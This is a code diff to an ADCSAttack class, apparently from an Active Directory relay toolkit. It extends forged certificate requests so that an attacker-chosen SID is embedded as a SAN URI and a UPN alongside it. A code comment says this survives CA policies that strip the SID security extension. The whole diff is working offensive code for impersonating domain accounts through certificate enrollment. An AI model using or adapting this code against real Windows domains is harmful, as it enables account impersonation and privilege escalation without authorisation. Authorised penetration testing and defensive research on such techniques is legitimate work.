@@ -78,6 +78,7 @@ ELEVATED = []
 class ADCSAttack:
     UPN_OID = ObjectIdentifier("1.3.6.1.4.1.311.20.2.3")
     NTDS_CA_SECURITY_EXT_OID = ObjectIdentifier("1.3.6.1.4.1.311.25.2")
+    SID_URL_PREFIX = "tag:microsoft.com,2022-09-14:sid:"
 
     def _run(self):
         key = rsa.generate_private_key(public_exponent=65537, key_size=4096)
@@ -129,7 +130,7 @@ class ADCSAttack:
         else:
             LOG.info("CSR generated!")
 
-        certAttrib = self.generate_certattributes(current_template, self.config.altName)
+        certAttrib = self.generate_certattributes(current_template, self.config.altName, altSid)
 
         data = "Mode=newreq&CertRequest=%s&CertAttrib=%s&TargetStoreFlags=0&SaveCert=yes&ThumbPrint=" % (csr, certAttrib)
 
@@ -207,16 +208,29 @@ class ADCSAttack:
             subject.append(x509.NameAttribute(NameOID.COMMON_NAME, CN))
 
         builder = x509.CertificateSigningRequestBuilder().subject_name(x509.Name(subject))
+        san_entries = []
         if altName:
-            builder = builder.add_extension(
-                x509.SubjectAlternativeName([
-                    x509.OtherName(
-                        ADCSAttack.UPN_OID,
-                        _tlv(0x0c, altName.encode('utf-8'))
-                    )
-                ]),
-                critical=False
+            san_entries.append(
+                x509.OtherName(
+                    ADCSAttack.UPN_OID,
+                    _tlv(0x0c, altName.encode('utf-8'))
+                )
             )
+
+        # Certipy also represents the requested SID as a SAN URI. This survives
+        # policy configurations that strip szOID_NTDS_CA_SECURITY_EXT.
+        if altSid is not None:
+            if not re.fullmatch(r"S-\d+(?:-\d+)+", altSid, re.IGNORECASE):
+                raise ValueError("Invalid SID format: {}".format(altSid))
+            san_entries.append(
+                x509.UniformResourceIdentifier(ADCSAttack.SID_URL_PREFIX + altSid)
+            )
+
+        if san_entries:
+            builder = builder.add_extension(
+                x509.SubjectAlternativeName(san_entries), critical=False
+            )
+
         if altSid is not None:
             builder = builder.add_extension(
                 x509.UnrecognizedExtension(
@@ -242,9 +256,24 @@ class ADCSAttack:
         return pfx_data
     
     @staticmethod
-    def generate_certattributes(template, altName):
+    def generate_certattributes(template, altName, altSid=None):
+        san_parts = []
         if altName:
-            return "CertificateTemplate:{}%0d%0aSAN:upn={}".format(template, altName)
+            san_parts.append(
+                "upn={}".format(urllib.parse.quote(altName, safe="@._-"))
+            )
+        if altSid:
+            san_parts.append(
+                "url={}".format(
+                    urllib.parse.quote(
+                        ADCSAttack.SID_URL_PREFIX + altSid, safe=":._-"
+                    )
+                )
+            )
+        if san_parts:
+            return "CertificateTemplate:{}%0d%0aSAN:{}".format(
+                template, "%26".join(san_parts)
+            )
         return "CertificateTemplate:{}".format(template)
     
     def enum_templates(self):
